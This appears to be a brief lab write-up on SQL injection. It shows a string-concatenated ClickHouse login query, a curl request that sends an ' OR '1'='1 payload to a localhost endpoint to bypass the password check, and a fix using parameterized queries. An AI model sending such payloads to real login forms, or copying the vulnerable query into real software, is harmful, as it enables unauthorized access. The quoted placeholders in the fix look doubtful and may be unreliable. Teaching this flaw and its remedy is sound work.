# sqli101 - part 1

## Vulnerability
Unescaped user inputs used in the following SQL query.
```js
db.testQuery("SELECT count() as c\nFROM user\nWHERE username = '" + username + "' AND password = '" + password + "'")
```

## Exploitation
```bash
curl --request POST \
  --url http://localhost:80/check_credentials \
  --header 'Content-Type: application/json' \
  --data '{
    "username": "admin",
    "password": "'\'' OR '\''1'\''='\''1"
}'
```

## Fix
User inputs should be validated (can use a regex to restrict to a subset of ascii characters).  
User inputs can also be escaped.

It is also possible to use query parameterized queries. (cf [ClickHouse documentation](https://clickhouse.com/docs/en/interfaces/cli#cli-queries-with-parameters)).  
Implementing that solution changes two files, `routes/index.js` and `database.js`

```js
db.testQuery("SELECT count() as c\nFROM user\nWHERE username = '{username:String}' AND password = '{password:String}'", {'username': username, 'password': password})

async testQuery(query, parameters) {
    return this.clickhouse.query(query, {'params': parameters}).toPromise();
}
```
